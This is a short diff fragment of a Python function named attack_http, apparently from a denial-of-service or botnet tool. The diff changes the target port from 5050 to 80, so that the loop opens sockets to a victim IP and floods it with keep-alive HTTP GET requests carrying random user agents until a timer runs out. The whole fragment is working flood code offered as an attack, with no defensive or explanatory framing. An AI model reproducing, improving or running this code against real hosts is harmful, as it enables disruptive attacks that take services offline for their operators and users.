@@ -55,7 +55,7 @@ def attack_http(ip, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            s.connect((ip, 5050))
+            s.connect((ip, 80))
             while time.time() < secs:
                 s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
         except:
